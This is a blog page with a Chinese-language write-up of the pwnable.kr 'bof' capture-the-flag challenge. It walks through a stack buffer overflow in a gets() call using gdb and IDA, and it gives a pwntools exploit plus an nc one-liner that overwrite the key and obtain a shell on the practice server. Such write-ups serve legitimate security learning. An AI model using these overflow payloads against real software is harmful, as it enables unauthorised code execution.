@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="解题源代码在bof.c123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;    char overflowme[32];    printf(&quot;overflow me : &quot;);    gets(ov">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnbale.kr3-bof">
+<meta property="og:url" content="http://betterlh.github.io/2019/04/07/pwnbale-kr3-bof/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="解题源代码在bof.c123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;    char overflowme[32];    printf(&quot;overflow me : &quot;);    gets(ov">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://betterlh.github.io/2019/04/07/pwnbale-kr3-bof/t.PNG">
+<meta property="og:image" content="http://betterlh.github.io/2019/04/07/pwnbale-kr3-bof/1.PNG">
+<meta property="og:image" content="http://betterlh.github.io/2019/04/07/pwnbale-kr3-bof/f.PNG">
+<meta property="og:image" content="http://betterlh.github.io/2019/04/07/pwnbale-kr3-bof/2.PNG">
+<meta property="og:image" content="http://betterlh.github.io/2019/04/07/pwnbale-kr3-bof/3.PNG">
+<meta property="og:image" content="http://betterlh.github.io/2019/04/07/pwnbale-kr3-bof/4.PNG">
+<meta property="og:image" content="http://betterlh.github.io/2019/04/07/pwnbale-kr3-bof/5.png">
+<meta property="og:updated_time" content="2019-04-07T14:08:12.336Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnbale.kr3-bof">
+<meta name="twitter:description" content="解题源代码在bof.c123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;    char overflowme[32];    printf(&quot;overflow me : &quot;);    gets(ov">
+<meta name="twitter:image" content="http://betterlh.github.io/2019/04/07/pwnbale-kr3-bof/t.PNG">
+
+
+
+
+
+
+  <link rel="canonical" href="http://betterlh.github.io/2019/04/07/pwnbale-kr3-bof/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>pwnbale.kr3-bof | Hexo</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>Über</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Kategorien</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-schedule">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/schedule/" rel="section"><i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>Schedule</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/04/07/pwnbale-kr3-bof/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwnbale.kr3-bof
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-04-07 19:29:23 / Updated at: 22:08:12" itemprop="dateCreated datePublished" datetime="2019-04-07T19:29:23+08:00">2019-04-07</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>源代码在bof.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">    gets(overflowme);   <span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以看出只要让func的参数key==0xcafebabe就ok了<br>我们还得到一个名为bof的文件，用ida打开，查看func函数<br><img src="/2019/04/07/pwnbale-kr3-bof/t.PNG" alt=""></p>
+<p>我们看到，这个传入的值确是已经被程序写死了，即给定了一个数(0xdeadbeef)，所以我们要想办法把这个参数的值改成我们想要的。</p>
+<p>跟着网上题解思路：</p>
+<blockquote>
+<p>但是我们再往下看，会发现有一个函数gets，我想这个函数是很明显的一个漏洞函数了，因为它读入数据的时候，不检查缓冲区的界限，很容易造成缓冲区溢出漏洞，所以我们一般用fgets函数来代替它。再联系一下题目中的 Nana told me that buffer overflow is one of the most common software vulnerability.,没错了，问题就出在这里。<br>我们可以通过往gets函数中输入足够多的数据，使缓冲区溢出，用我们输入的0xcafebabe覆盖之前压进栈的参数，就get 到 flag 啦～</p>
+</blockquote>
+<p>这里可以学到 gets函数</p>
+<p>之后的问题就是我们需要知道往gets里面塞多少个数，才能刚好把我们想要的数覆盖在那个参数上面</p>
+<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>大佬说了，用gdb调试，那我们就依葫芦画瓢</p>
+<p>我们先输入start将程序运行起来<br>然后输入disassemble func来查看一下被调用函数func反汇编代码<br><img src="/2019/04/07/pwnbale-kr3-bof/1.PNG" alt=""><br>看来start不起来，试着直接反汇编，成功<br><img src="/2019/04/07/pwnbale-kr3-bof/f.PNG" alt=""></p>
+<p>我们可以找到熟悉的数字0xcafebabe</p>
+<p><img src="/2019/04/07/pwnbale-kr3-bof/2.PNG" alt=""><br>给权限后<br><img src="/2019/04/07/pwnbale-kr3-bof/3.PNG" alt=""><br>自己操作的时候有错，因此下面用网上的图和文字</p>
+<p>A的ASCLL值为41，可以看出，我们要覆盖的地址与输入地址相差52个字节.<br>x /40xw $esp (x:以十六进制显示 w:以4字节为一个单位显示)<br>来查看从断点处起的40字节的内存值，由于esp是我们的程序流指针，其里面保存了程序在func栈中运行时的内存的变化<br><img src="/2019/04/07/pwnbale-kr3-bof/4.PNG" alt=""><br>我们可以发现从第一个出现0x41的地方，到我们的0xdeadbeef距离是13个单位，一个单位是4字节，也就是我们的偏移量为52个字节。</p>
+<p>于是，只要我们构造出52个字节然后加上0xcafebabe，用它来覆盖0xdeadbeef即可<br>由于题目中提醒我们最后 Running at : nc pwnable.kr 9000<br>所以我们来写我们的exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = remote(<span class="string">"pwnable.kr"</span>,<span class="number">9000</span>)</span><br><span class="line">c.sendline(<span class="string">"AAAA"</span>*<span class="number">13</span>+p32(<span class="number">0xcafebabe</span>))</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="汇编解法"><a href="#汇编解法" class="headerlink" title="汇编解法"></a>汇编解法</h2><p>这篇利用ida 看汇编代码解的</p>
+<p>这是关于数组溢出的问题，导致这个问题的原因是由于 gets() 函数没有检查接受字符串长度导致的。有的编译器在编译源代码的时候也会提示警告。其实这个题目也是相当的简单，如果你了解栈机制的话。</p>
+<p>我们要做的就是让输入的字符串的后面四个字节覆盖 key。其实我们要做的就是算出 overflow 数组的首地址到 key 首地址之间的距离。<br><img src="/2019/04/07/pwnbale-kr3-bof/5.png" alt=""><br>gets(overflow) 是接受输入，当然是从 overflow 的首地址开始存储字节。前面的 esp （esp在汇编中为栈顶指针，栈中数据都是从栈顶进去的，所以你懂的…）存放的就是 overflow 的基址，为 ebp + s 其中 s = byte ptr - 2ch。然后 key 的基址当然要在 cmd 里面找，因为 if (key == 0x….) 所以 ebp + arg_0, 就是 key 的基址，其中 arg_0 = dword ptr 8。然后很简单的算出两者的距离为 52。所以我们在输入 0xcafebabe 之前需要填充 52 个字符。</p>
+<p>来源：<a href="https://blog.csdn.net/x1020915098/article/details/80917320" target="_blank" rel="noopener">https://blog.csdn.net/x1020915098/article/details/80917320</a> </p>
+<hr>
+<p>另一个文章给出的是这样的命令<a href="https://blog.csdn.net/hwz2311245/article/details/49485563" target="_blank" rel="noopener">原文：</a><br>另外，编译时，启用了canary作溢出保护。不过这个保护机制是当函数返回的时候才会被触发，而system已经被执行了，因此无法即使阻止。</p>
+<p>命令：(python -c ‘print(“a”*52+ chr(0xbe) + chr(0xba) + chr(0xfe) +chr(0xca))’; cat) | nc pwnable.kr 9000<br>PS：不大明白cat的作用是什么，但是如果不用的话，就会被canary检测到溢出，从而程序被中止，无法获取shell</p>
+<hr>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>gets函数 是一个漏洞函数，要利用起来<br>使用gdb调试<br>可以使用ll 命令来查看当前文件夹下的文件的权限<br>是否有 执行权限-x</p>
+<hr>
+<p>原文：<a href="https://blog.csdn.net/qq_37414405/article/details/84960283" target="_blank" rel="noopener">https://blog.csdn.net/qq_37414405/article/details/84960283</a> </p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/07/gdb/" rel="next" title="gdb">
+                <i class="fa fa-chevron-left"></i> gdb
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">lh</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">59</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#解题"><span class="nav-number">1.</span> <span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#gdb调试"><span class="nav-number">1.1.</span> <span class="nav-text">gdb调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#汇编解法"><span class="nav-number">1.2.</span> <span class="nav-text">汇编解法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结："><span class="nav-number">2.</span> <span class="nav-text">总结：</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lh</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.7.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
